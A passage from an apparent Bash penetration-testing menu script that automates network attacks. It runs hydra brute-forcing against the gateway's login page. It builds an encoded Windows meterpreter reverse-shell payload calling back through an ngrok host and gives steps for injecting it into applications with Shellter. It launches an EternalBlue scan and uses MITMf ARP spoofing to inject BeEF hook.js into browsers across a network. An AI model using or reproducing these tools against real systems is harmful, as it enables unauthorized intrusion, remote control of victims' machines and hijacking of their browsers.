	elif [[ "$BR" = 6 ]]
	then
		echo -n "Invalid pass string: "
		read IS
		iss=1
	elif [[ "$BR" = 7 ]]
	then
		echo -n "Form: "
		read FM
	elif [[ "$BR" = 8 ]]
	then
		if [[ "$bin" != 1 ]]
		then
			echo -e ""$RS"Please select an interface first"$CE""
			sleep 3
			continue
		fi
		TT=$(ifconfig | grep "$BI")
		if [[ "$TT" = "" ]]
		then
			echo -e ""$RS""$BI" is not available"$CE""
			sleep 2
			BI=""
			continue
		fi
		echo -e ""$BS"Searching gateway on "$BI""$CE"..."
		sleep 0.5
		GATE=$(find_gateways "$BI" interface)
		TTT=$(is_it_an_ip "$GATE")
		if [[ "$TTT" != 1 ]]
		then
			echo -e ""$RS"Couldn't find your gateway."$CE""
			sleep 2
			echo -e ""$RS"Make sure you are connected to a network"$CE""
			sleep 3
			continue
		else
			echo -e ""$YS"Gateway found: "$GATE""$CE""
			sleep 1
		fi
		clear
		gio open "http://"$GATE""
		echo -e "Your browser is going to open"
		sleep 2
	elif [[ "$BR" = "s" ]]
	then
		if [[ "$bin" != 1 ]]
		then
			echo -e ""$RS"Please select an interface first"$CE""
			sleep 3
			continue
		fi
		if [[ "$wls" != 1 ]] 
		then
			echo -e ""$RS"Set a wordlist first"$CE""
			sleep 2
			continue
		fi
		TT=$(ifconfig | grep "$BI")
		if [[ "$TT" = "" ]]
		then
			echo -e ""$RS""$BI" is not available"$CE""
			sleep 2
			BI=""
			continue
		fi
		if [[ "$rqq" != 1 ]]
		then
			echo -e ""$RS"Please set the Request URI"$CE""
			sleep 2
			continue
		fi
		if [[ "$iss" != 1 ]]
		then
			echo -e ""$RS"Please set the invalid pass string"$CE""
			sleep 2
			continue
		fi
		if [[ "$upp" != 1 ]]
		then
			echo -e ""$RS"Please set the ^USER^ & ^PASS^ field"$CE""
			sleep 2
			continue
		fi
		if [[ "$FM" = "" ]]
		then
			echo -e ""$RS"Set the Form first"$CE""
			sleep 2
			continue
		fi
		echo -e ""$BS"Searching gateway on "$BI""$CE"..."
		sleep 1
		GATE=$(find_gateways "$BI" interface)
		TTT=$(is_it_an_ip "$GATE")
		if [[ "$TTT" != 1 ]]
		then
			echo -e ""$RS"Couldn't find your gateway."$CE""
			sleep 2
			echo -e ""$RS"Make sure you are connected to a network"$CE""
			sleep 3
			continue
		else
			echo -e ""$YS"Gateway found: "$GATE""$CE""
			sleep 2
		fi
		clear
		echo -e ""$RS"Do you have permission to bruteforce this network?"$CE""$YNONLY""
		read PERM
		if [[ "$PERM" != "y" && "$PERM" != "Y" ]]
		then
			echo -e ""$RS"You cannot proceed then"$CE""
			sleep 3
			continue
		fi
		hydra -l "$US" -P "$WL" -e nsr -f -V "$GATE" "$FM" ""$RQ":"$UP":"$IS""
		echo -e "$PAKTGB"
		$READAK
	fi
done
}
function find_gateways()
{
	#example: find_gateways wlan0 interface
	FG1="$1"
	FG2="$2"
	if [[ "$FG1" = "" ]]
	then
		echo -e ""$BS"Gateways"$CE": "
		n=0
		ethr=$(ifconfig | grep "$ETH")
		if [[ "$ethr" != "" ]]
		then
			ethd=$(route -n | awk -v int1="$ETH" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$ethd")
			if [[ "$ethd" != "" && "$chi" = 1 ]]
			then
				echo -e ""$ETH" = "$YS""$ethd""$CE""
				n=1
			fi
		fi
		wlanr=$(ifconfig | grep "$WLANN")
		if [[ "$wlanr" != "" ]]
		then
			wland=$(route -n | awk -v int1="$WLANN" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$wland")
			if [[ "$wland" != "" && "$chi" = 1 ]]
			then
				echo -e ""$WLANN" = "$YS""$wland""$CE""
				n=1
			fi
		fi
		wlanmr=$(ifconfig | grep "$WLANNM")
		if [[ "$wlanmr" != "" ]]
		then
			wlanmd=$(route -n | awk -v int1="$WLANNM" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$wlanmd")
			if [[ "$wlanmd" != "" && "$chi" = 1 ]]
			then
				echo -e ""$WLANNM" = "$YS""$wlanmd""$CE""
				n=1
			fi
		fi
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"No known interfaces found available"$CE""
		fi
	else
		if [[ "$FG2" = "interface" ]]
		then
			inttos=$(ifconfig | grep "$FG1")
			if [[ "$inttos" != "" ]]
			then
				gate=$(route -n | awk -v int1="$FG1" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
				cho=$(is_it_an_ip "$gate")
				if [[ "$cho" = 1 ]]
				then
					echo "$gate"
				fi
			else
				echo 0
			fi
		#~ elif [[ "$FG2" = "ip" ]]
		#~ then
			#~ iptos=$(ifconfig | grep "$FG1")
			#~ if [[ "$iptos" != "" ]]
			#~ then
				#~ dot=$(give_ip_take_zero "$FG1" "dot")
				#~ gate=$(route -n | awk -v int1="$dot" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
				#~ echo "$gate"
				#~ cho=$(is_it_an_ip "$gate")
				#~ if [[ "$cho" = 1 ]]
				#~ then
					#~ echo "$gate"
				#~ fi
			#~ else
				#~ echo 0
			#~ fi
		#~ else
			#~ echo -e ""$RS"Could not identify 2nd parameter"$CE""
			#~ sleep 4
		fi		
	fi
}
function select_interface
{
	while true
	do
		clear
		TERMINALTITLE="Select interface"
		dash_calc
		printf '\033]2;SELECT INTERFACE\a'
		TT=$(ifconfig | grep "$WLANN:")
		if [[ "$TT" != "" ]]
		then
			echo -e ""$YS" 1"$CE") "$WLANN""
		else
			echo -e ""$RS" 1"$CE") "$RS""$WLANN""$CE""
		fi
		TT=$(ifconfig | grep "$ETH:")
		if [[ "$TT" != "" ]]
		then
			echo -e ""$YS" 2"$CE") "$ETH""
		else
			echo -e ""$RS" 2"$CE") "$RS""$ETH""$CE""
		fi
		echo -e ""$YS" 3"$CE") Manually type an interface"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read CI
		if [[ "$CI" = 1 ]]
		then
			TT=$(ifconfig | grep "$WLANN:")
			if [[ "$TT" != "" ]]
			then
				SINT="$WLANN"
				OUTPUT="$SINT"
				inter=0
				break
			else
				inter=1
				OUTPUT=0
				echo -e ""$RS"Could not find this interface"$CE""
				sleep 2
				continue
			fi
		elif [[ "$CI" = 2 ]]
		then
			TT=$(ifconfig | grep "$ETH:")
			if [[ "$TT" != "" ]]
			then
				SINT="$ETH"
				OUTPUT="$SINT"
				inter=0
				break
			else
				inter=1
				OUTPUT=0
				echo -e ""$RS"Could not find this interface"$CE""
				sleep 2
				continue
			fi
		elif [[ "$CI" = 3 ]]
		then
			echo -e "Interface to use: "
			read ITU
			TT=$(ifconfig | grep "$ITU:")
			if [[ "$TT" != "" ]]
			then
				SINT="$ITU"
				OUTPUT="$SINT"
				inter=0
				break
			else
				echo -e ""$RS"Could not find this interface"$CE""
				echo -e "Do you still want to use it?"$YNNO": "
				read SU
				if [[ "$SU" = "y" ]]
				then
					SINT="$ITU"
					OUTPUT="$SINT"
					inter=0
					break
				else
					OUTPUT=0
					continue
				fi
			fi
		elif [[ "$CI" = "b" ]]
		then
			clear
			break
		fi
	done
}
function donate_option
{
	while true
	do
	clear
	TERMINALTITLE="DONATION"
	dash_calc
	printf '\033]2;DONATION\a'
	echo -e "If you found my script useful, you can buy me a coffee :)"
	echo -e ""$LBS"Total lscript donations:"$CE" $DONATIONS"
	echo -e ""$YS" 1"$CE") Open browser to donate"
	echo -e ""$YS" 2"$CE") Copy donation link"
	echo -e ""$YS" b"$CE") I don't care about your work! :P"
	echo -e "Choose: "
	read DON
	if [[ "$DON" = "1" ]]
	then
		gio open "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
	elif [[ "$DON" = "2" ]]
	then
		echo -e "Donation link: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$DON" = "back" || "$DON" = "b" || "$DON" = "00" ]]
	then
		BACKL=1
		break
	elif [[ "$DON" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function ngrok_option
{
	while true
	do
		clear
		if [[ -f /root/ngrok ]]
		then
			TERMINALTITLE="NGROK"
			dash_calc
			printf '\033]2;NGROK\a'
			echo -e ""$YS"help"$CE") How to make it work?"
			echo -e ""$YS" 1"$CE") Open a tcp port"
			echo -e ""$YS" 2"$CE") Open a tls port"
			echo -e ""$YS" 3"$CE") Open a http port"
			echo -e ""$YS" 4"$CE") Intergrate with Shellter"
			echo -e ""$YS" 5"$CE") Set your ngrok authtoken"
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read NG
			clear
			if [[ "$NG" = "help" || "$NG" = "h" ]]
			then
				echo -e "With ngrok, you can port forward without router intergration."
				echo -e "It is free, HOWEVER:"
				echo -e "---to open a tcp port, you need to sign up (it's too easy)"
				echo -e "   Go to https://ngrok.com and choose "$YS"sign up"$CE"."
				echo -e "   When that's done, copy the given "$YS"authtoken"$CE"."
				echo -e "   (If you can't find it go to: https://dashboard.ngrok.com/auth )"
				echo -e "   Then select the 'set your authtoken' option in lscript, and paste it."
				echo -e "---to make a reverse tcp payload:"
				echo -e "   You need to set the payload to: windows/meterpreter/reverse_tcp_dns"
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$NG" = 1 || "$NG" = 2 || "$NG" = 3 ]]
			then
				echo -e "Type the local port to forward: "
				read PORTL
				if [[ "$NG" = 1 ]]
				then
					PROT="tcp"
				elif [[ "$NG" = 2 ]]
				then
					PROT="tls"
				else
					PROT="http"
				fi
				export PORTL
				export PROT
				xterm -geometry 85x15+9999+999999 -e bash -c './ngrok $PROT $PORTL; exec bash' & disown
			elif [[ "$NG" = 4 ]]
			then
				while true
				do
					clear
					echo -e ""$YS" 1"$CE") Make a raw tcp payload for Shellter"
					echo -e ""$YS" 2"$CE") How to intergrate it"
					echo -e ""$YS" b"$CE") Go back"
					echo -e "Choose:"
					read SHINT
					clear
					if [[ "$SHINT" = 1 ]]
					then
						while true
						do
							if [[ "$NGPORT" = "" ]]
							then
								NGPORT="\e[1;31mNONE\e[0m"
							fi
							clear
							echo -e ""$YS" 1"$CE") Set the Ngrok tcp port              CURRENT:"$NGPORT""
							#~ echo -e ""$YS" 2"$CE") Set your local tcp port             CURRENT:"$LPORT""
							echo -e ""$YS" b"$CE") Go back"
							echo -e ""$YS"run"$CE") Make the payload"
							echo -e "Choose: "
							read RP
							if [[ "$RP" = 1 ]]
							then
								echo -e "Ngrok port: "
								read NGPORT
							elif [[ "$RP" = "back" || "$RP" = "b" ]]
							then
								break
							elif [[ "$RP" = "run" ]]
							then
								RAW=rawfud
								NUMB=1
								while true
								do
									RAWN=""$RAW""$NUMB""
									if [[ -f /root/Desktop/"$RAWN".raw ]]
									then
										NUMB=$((NUMB+1))
									else
										break
									fi
								done
								msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=0.tcp.ngrok.io LPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/"$RAWN".raw
								sleep 2
								if [[ -f /root/Desktop/"$RAWN".raw ]]
								then
									clear
									echo -e "Payload was saved to /root/Desktop/"$RAWN".raw"
								fi
								echo -e "$PAKTGB"
								$READAK
							fi
						done
					elif [[ "$SHINT" = 2 ]]
					then
						echo -e "First you should make a raw payload with option 1."
						echo -e "Then open shellter and select your app to be injected."
						echo -e "Then, on stealth mode select y."
						echo -e "Select to type a custom payload, NOT listed."
						echo -e "Then type the path of the payload you have created on option 1."
						echo -e "For the listener, the payload is windows/meterpreter/reverse_tcp_dns"
						echo -e "LHOST is 127.0.0.1 and LPORT is the port you opened to ngrok."
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$SHINT" = "back" || "$SHINT" = "b" ]]
					then
						break
					fi
				done
			elif [[ "$NG" = "back" || "$NG" = "b" || "$NG" = "00" ]]
			then
				clear
				break
			elif [[ "$NG" = 0 ]]
			then
				clear
				exit
			elif [[ "$NG" = 5 ]]
			then
					echo -e "Type your authtoken: "
					read AUTHT
					if [[ "$AUTHT" != "" ]]
					then
						./ngrok authtoken $AUTHT
						echo -e "$PAKTGB"
						$READAK
					fi
			fi
		else
			echo -e ""$RS"Ngrok is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ngrok
			fi
		fi
	done
}
function geolocate_ip()
{
	locbool=1
	echo -e ""$BS"Please wait..."$CE""
	A1="$1"
	AA1=$(is_it_an_ip "$A1")
	if [[ "$AA1" = 1 ]]
	then
		country=$(curl ipinfo.io/"$A1"/country 2>/dev/null)
		if [[ "$country" = "" ]]
		then
			country=""$RS"Not found"$CE""
		fi
		loc=$(curl ipinfo.io/"$A1"/loc 2>/dev/null)
		if [[ "$loc" = "" ]]
		then
			locbool=0
			loc=""$RS"Not found"$CE""
		fi
		city=$(curl ipinfo.io/"$A1"/city 2>/dev/null)
		if [[ "$city" = "" ]]
		then
			city=""$RS"Not found"$CE""
		fi
		org=$(curl ipinfo.io/"$A1"/org 2>/dev/null)
		if [[ "$org" = "" ]]
		then
			org=""$RS"Not found"$CE""
		fi
		postal=$(curl ipinfo.io/"$A1"/postal 2>/dev/null)
		if [[ "$postal" = "" ]]
		then
			postal=""$RS"Not found"$CE""
		fi
		region=$(curl ipinfo.io/"$A1"/region 2>/dev/null)
		if [[ "$region" = "" ]]
		then
			region=""$RS"Not found"$CE""
		fi
		hostname=$(curl ipinfo.io/"$A1"/hostname 2>/dev/null)
		if [[ "$hostname" = "" ]]
		then
			hostname=""$RS"Not found"$CE""
		fi
		echo -e "     Country: $country"
		echo -e "      Region: $region"
		echo -e "    Location: $loc"
		echo -e "        City: $city"
		echo -e "      Postal: $postal"
		echo -e "    Hostname: $hostname"
		echo -e "Organization: $org"
		if [[ "$locbool" = 0 ]]
		then
			echo -e ""$RS" m"$CE") Open google maps location"
		else
			echo -e ""$YS" m"$CE") Open google maps location"
		fi
		echo -e ""$YS" *"$CE") Go back"
		echo -e "Choose: "
		read ge
		if [[ "$ge" = "m" ]]
		then
			if [[ "$locbool" = 0 ]]
			then
				echo -e ""$RS"Location was not found"$CE""
				sleep 3
			else
				gio open https://www.google.gr/maps/search/"$loc"/
			fi
		else
			clear
			BACKL=1
		fi
	else
		echo 0
	fi
}
function ip_scan()
{
	
while true
do
	#passing interface
	IPF=$1
	#passing mode if any  (1=choosable   2=only rescanable)
	#Mode 1 is for choosing and returning the IP.
	#Mode 2 is for echoing the scan, not choosing.
	MODE=$2
	export IPF
	if [[ "$IPF" = "" ]]
	then
		echo -e ""$RS"Error 6. No parameters passed"$CE""
		sleep 3
		break
	fi
	#getting local ip
	LLL=$(local_ips $IPF)
	#getting zero ip
	ZERO=$(give_ip_take_zero $LLL)
	export ZERO
	echo -e ""$BS"Scanning, please wait..."$CE""
	tempfile="/root/lscript/tempscan.txt"
	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile"
	#gnome-terminal -- arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile
	clear
	######
	T1=$(cat $tempfile | grep "Ending arp-scan")
	if [[ "$T1" = "" ]]
	then
		lines=$(cat $tempfile | awk 'END{print NR}')
		hosts=$((lines-3))
	else
		lines=$(cat $tempfile | awk 'END{print NR}')
		hosts=$((lines-5))
	fi
	hostsbackup="$hosts"
		if [[ "$hosts" -le 0 ]]
		then
			echo -e ""$RS"No hosts found"$CE""
			sleep 1
		else
			echo -e ""$BS"Host(s) found:"$CE""
			##########
			n=1
			n2=2
			while [[ "$n" -le "$hosts" ]]
			do
				#Hosts start from line 3
				n1=$((n2+n))
				host[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1 && $0 !~ /DUP:/){print $1}}')
				if [[ "${host[$n]}" = "" ]]
				then
					#sometimes there are duplicate IPs.This should remove them.
					n2=$((n2+1))
					hosts=$((hosts-1))
					#~ n=$((n+1))
					continue
				fi
				size=${#host[$n]}
				sized=$((20-size))
				SPACESN=" "
				numcalc=1
				while [ $numcalc != $sized ]
				do
					SPACESN=""${SPACESN}" "
					numcalc=$(( numcalc+1 ))
				done
				mi[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $2}}')
				im[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $3}}')
				if [[ "$MODE" = 1 ]]
				then
					echo -e ""$YS" $n"$CE") "${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
				else
					echo -e ""${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
				fi
				n=$((n+1))
			done
			if [[ "$MODE" = 1 ]]
			then
				echo -e ""$YS" r"$CE") Rescan"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read sch
				if [[ "$sch" = "b" ]]
				then
					echo ""
				elif [[ "$sch" = "r" ]]
				then
					clear
					continue
				elif [[ "$sch" -le "$hosts" && "$sch" -ge 1 ]]
				then
					OUTPUT="${host[$sch]}"
					export OUTPUT
					#~ echo "$OUTPUT"
				fi
			else
				echo -e ""$YS" e"$CE") Check eternalblue exploit on IPs"
				echo -e ""$YS" r"$CE") Rescan"
				echo -e "Press "$YS"any other key"$CE" to go back"
				read -n 1 ko
				if [[ "$ko" = "r" ]]
				then
					clear
					continue
				elif [[ "$ko" = "e" ]]
				then
					n=1
					totalhosts=""
					while [[ "$n" -le "$hostsbackup" ]]
					do
						totalhosts=""$totalhosts" "${host["$n"]}""
						n=$((n+1))
					done
					clear
					if [[ "$totalhosts" = "" || "$totalhosts" = " " ]]
					then
						echo -e ""$RS"No hosts found to check"$CE""
						sleep 2
						continue
					fi
					echo -e ""$BS"RHOSTS"$CE" <- "$totalhosts""
					sleep 2
					if [[ ! -d "$LPATH"/rce ]]
					then
						mkdir	"$LPATH"/rce
					fi
					echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
					echo "set RHOSTS "$totalhosts"" >> "$LPATH"/rce/eternalbluerc.rc
					echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
					echo -e ""$BS"Launching msfconsole. Please wait..."$CE""
					msfconsole -r "$LPATH"/rce/eternalbluerc.rc
				else
					BACKL=1
					break
				fi
			fi
			##########
		fi
		break
	#~ fi
	######
done

}
function browser_exploiting
{
	if [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]
	then
		echo -e ""$BS"Installing arp-scan"$CE""
		install_arp_scan
		clear
	fi
	TAR=""
	SINT=""
	beefrunning=0
	clear
	while true
	do
		clear
		TERMINALTITLE="Auto-exploit browser"
		dash_calc
		printf '\033]2;AUTO-EXPLOIT BROWSER\a'
		if [[ "$SINT" = "" ]]
		then
			WL=$(ifconfig | grep "$WLANN:")
			if [[ "$WL" != "" ]]
			then
				SINT="$WLANN"
				inter=0
			else
				EL=$(ifconfig | grep "$ETH:")
				if [[ "$EL" != "" ]]
				then
					SINT="$ETH"
					inter=0
				else
					SINT=""$RS"Not found"$CE""
					inter=1
				fi
			fi
			
		fi
		if [[ "$TAR" = "" ]]
		then
			TAR=""$RS"Not set"$CE""
			tarer=1
		fi
		echo -e ""$YS" 1"$CE") Select interface                CURRENT:"$YS""$SINT""$CE""
		echo -e ""$YS" 2"$CE") Select target                   CURRENT:"$YS""$TAR""$CE""
		echo -e ""$YS" 3"$CE") Start BeEF"
		echo -e ""$YS" 4"$CE") Open BeEF's ui panel in browser"
		echo -e ""$YS" 5"$CE") Start MITMf"
		echo -e ""$YS" 6"$CE") Fix errors"
		#~ echo -e ""$YS" 4"$CE") Close all windows"
		echo -e ""$YS" i"$CE") Info"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read AEB
		clear
		if [[ "$AEB" = "b" || "$AEB" = 00 ]]
		then
			clear
			BACKL=1
			break
		elif [[ "$AEB" = "i" ]]
		then
			clear
			echo -e ""$LGYS"On this menu you can exploit and control browsers on your network."
			echo -e "Instructions: "
			echo -e "BeEF:"
			echo -e "	First you need to specify an interface. Then start BeEF."
			echo -e "	Then open the UI panel and log in with beef:beef ."
			echo -e "	There you will see if any online browsers."
			echo -e "MITMf:"
			echo -e "	First you need to specify an interface and a target. Then start MITMf."
			echo -e "	MITMf tries to inject the hook.js javascript to the target's website."$CE""
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$AEB" = 6 ]]
		then
			while true
			do
			clear
			TERMINALTITLE="Fix errors"
			dash_calc
			printf '\033]2;FIX ERRORS\a'
			echo -e ""$YS" 1"$CE") MITMf error: Another process running on port 53"
			echo -e ""$YS" 2"$CE") BeEF  error: Another process listening on port 3000"
			echo -e ""$YS" 3"$CE") MITMf error: Could not resolve Gateway's MAC"
			echo -e ""$YS" 4"$CE") MITMf error: [Errno 98] Address already in use"
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read AE
			clear
			if [[ "$AE" = 1 ]]
			then
				#~ echo -e "For this error, you need to type "$YS"netstat -lnpu | grep :53"$CE" to find the process that runs
				#~ on port 53 and kill it by "$YS"kill <PID>"$CE""
				PID1=$(lsof -t -i:53)
				if [[ "$PID1" = "" ]]
				then
					echo -e ""$RS"Could not find the process running on port 53"$CE""
				else
					kill $PID1 && echo -e ""$YS"Fixed."$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 2 ]]
			then
				echo -e "You are facing this error because you did not press "$YS"ctrl c"$CE" on BeEF's window
				to close it."
				echo -e ""
				PID1=$(lsof -t -i:3000)
				if [[ "$PID1" = "" ]]
				then
					echo -e ""$RS"Could not find the process running on port 3000"$CE""
				else
					kill $PID1 && echo -e ""$YS"Fixed."$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 3 ]]
			then
				echo -e "The only fix on this is to retry mitmf option until it starts correctly."
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 4 ]]
			then
				HT=$(lsof -t -i:80)
				if [[ "$HT" = "" ]]
				then
					echo -e ""$RS"Could not find the issue"$CE""
				else
					kill $HT && echo -e ""$YS"Fixed"$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = "b" ]]
			then
				clear
				break
			fi
			done
		elif [[ "$AEB" = 4 ]]
		then
			#make sure BeEF is running.
			if [[ "$beefrunning" = 0 ]]
			then
				echo -e ""$RS"BeEF is not running"$CE""
				sleep 3
			else
				clear
				export SINT
				LOC=$(local_ips $SINT)
				export LOC
				CONF=$(is_it_an_ip $LOC)
				if [[ "$CONF" = 1 ]]
				then
					gio open http://"$LOC":3000/ui/panel
				else
					echo -e ""$RS"Could not find your local IP"$CE""
					sleep 3
				fi
			fi
		elif [[ "$AEB" = 2 ]]
		then
			if [[ "$inter" != 1 ]]
			then
				clear
				while true
				do
					clear
					TERMINALTITLE="Select target"
					dash_calc
					printf '\033]2;SELECT TARGET\a'
					echo -e ""$YS" 1"$CE") Scan and choose"
					echo -e ""$YS" 2"$CE") Type target's IP"
						echo -e ""$YS" 3"$CE") Target the whole network"
					echo -e ""$YS" b"$CE") Go back"
					echo -e "Choose: "
					read TARR
					clear
					if [[ "$TARR" = "b" ]]
					then
						break
					elif [[ "$TARR" = 1 ]]
					then
						ip_scan $SINT 1
						TARGETI="$OUTPUT"
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							tarer=1
						fi
						wholenetwork=0
						break
					elif [[ "$TARR" = 2 ]]
					then
						echo -e "Target: "
						read TARGETI
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							echo -e ""$RS"Invalid IP"$CE""
							tarer=1
							sleep 2
						fi
						wholenetwork=0
						break
					elif [[ "$TARR" = 3 ]]
					then	
						TAR="EVERYONE"
						tarer=0
						wholenetwork=1
						break
					fi
				done
			else
				echo -e ""$RS"Select interface first"$CE""
				sleep 2
			fi
		elif [[ "$AEB" = 5 ]]
		then
			if [[ "$inter" = 0 && "$tarer" = 0 ]]
			then
				if [[ -d /root/MITMf ]]
				then
						mitmfint="$SINT"
						export mitmfint
						clear
						mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
						isit=$(is_it_an_ip "$mitmfgate")
						if [[ "$mitmfgate" != "" && "$isit" = 1 ]]
						then
							export mitmfgate
							clear
							TEST=$(ifconfig | grep $mitmfint)
							if [[ $TEST != "" ]]
							then
								iffile=""$LPATH"/iftemp.txt"
								ifconfig $mitmfint > $iffile
								mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
							else
								echo -e ""$RS"ERROR 5. Could not find your local IP. Make sure you are connected to a network on interface "$SINT""$CE""
								echo -e "$PAKTGB"
								$READAK
								continue
							fi
							clear
							echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
							read hookch
							if [[ "$hookch" = "" ]]
							then
								mitmfhook="http://"$mitmflocalip":3000/hook.js"
							else
								mitmfhook="$hookch"
							fi
							export mitmfhook
							cd /root/MITMf
							clear
							if [[ "$wholenetwork" == 0 ]]
							then
								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
							else
								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
							fi
							cd
						else
							echo -e ""$RS"ERROR 4. Could not find gateway. Make sure you are connected to a network on interface "$SINT""$CE""
							echo -e "$PAKTGB"
							$READAK
						fi
				else
					echo -e ""$RS"Mitmf is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."
					read INSTALL
					if [[ "$INSTALL" = "install" ]]
					then
						install_mitmf
					fi
				fi
				cd
			else
				if [[ "$inter" = 1 ]]
				then
					echo -e ""$RS"No interface selected"$CE""
				fi
				if [[ "$tarer" = 1 ]]
				then
					echo -e ""$RS"No target selected"$CE""
					sleep 1
				fi
				sleep 2
			fi
		elif [[ "$AEB" = 3 ]]
		then
			if [[ "$inter" = 1 ]]
			then
				echo -e ""$RS"No interface selected"$CE""
				sleep 2
				continue
			fi
			cd /usr/share/beef-xss 
			beefrunning=1
			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
			cd
		elif [[ "$AEB" = 0 ]]
		then
			clear
			exit
		elif [[ "$AEB" = 1 ]]
		then
			select_interface
			
		#if inter=1 then error
		fi
	done
}
function settings_menu
{
	if [[ ! -d "$LPATH"/settings ]]
	then
		mkdir "$LPATH"/settings 
	fi
	clear
	while true
	do
		clear
		TERMINALTITLE="SETTINGS"
		dash_calc
		printf '\033]2;SETTINGS\a'
		if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
		then
			read ALFA < "$LPATH"/settings/AWUS036ACH.txt
		else
			ALFA="no"
		fi
		if [[ -f "$LPATH"/settings/startmac.txt ]]
		then
			read STARTMAC < "$LPATH"/settings/startmac.txt
		else
			STARTMAC="00:11:22:33:44:55"
		fi
		if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
		then
			read IGN < "$LPATH"/settings/ignorenegativeone.txt
		else
			IGN="no"
		fi
		if [[ -f "$LPATH"/settings/arpin.txt ]]
		then
			read ARPIN < "$LPATH"/settings/arpin.txt
		else
			ARPIN="$WLANN"
		fi
		echo -e ""$YS" 1"$CE") Change logo color"
		echo -e ""$YS" 2"$CE") Howdoi settings"
		echo -e ""$YS" 3"$CE") ALFA AWUS036ACH support                      $ALFA"
		echo -e ""$YS" 4"$CE") Ignore negative one when deauthing           $IGN"
		echo -e ""$YS" 5"$CE") MAC to change to,when starting monitor       $STARTMAC"	
		echo -e ""$YS" 6"$CE") Interface for arp-scan                       $ARPIN"
		echo -e ""$YS" 7"$CE") Interface for iftop(show bandwidth)          $iftopint"
		echo -e ""$YS" b"$CE") Go back"
		echo -e ""$YS" 0"$CE") Exit"
		echo -e "Choose: "
		read SET
		clear
		if [[ "$SET" = "back" || "$SET" = "b" || "$SET" = "00" ]]
		then
			BACKL=1
			break
		elif [[ "$SET" = 0 ]]
		then
			exit
		elif [[ "$SET" = 7 ]]
		then
			clear
			echo -e ""$BS"Interface to be used for iftop: "$CE""
			read IFTOP
			IFTOPTEST=$(ifconfig | grep "$IFTOP")
			if [[ "$IFTOPTEST" = "" ]]
			then
				echo -e ""$RS""$IFTOP" is not currently available."$CE""
				echo -e "Do you still want to use $IFTOP for iftop?"$YNYES""
				read STARP
				if [[ "$STARP" = "n" ]]
				then
					IFTOP=""
					continue
				fi
			fi
			echo -e "$IFTOP" > "$LPATH"/settings/iftopint.txt
		elif [[ "$SET" = 6 ]]
		then
			clear
			echo -e ""$BS"Interface to be used for arp-scan: "$CE""
			read ARPIN
			ARPINTEST=$(ifconfig | grep "$ARPIN")
			if [[ "$ARPINTEST" = "" ]]
			then
				echo -e ""$RS""$ARPIN" is not currently available."$CE""
				echo -e "Do you still want to use $ARPIN for arp-scan?"$YNYES""
				read STARP
				if [[ "$STARP" = "n" ]]
				then
					ARPIN=""
					continue
				fi
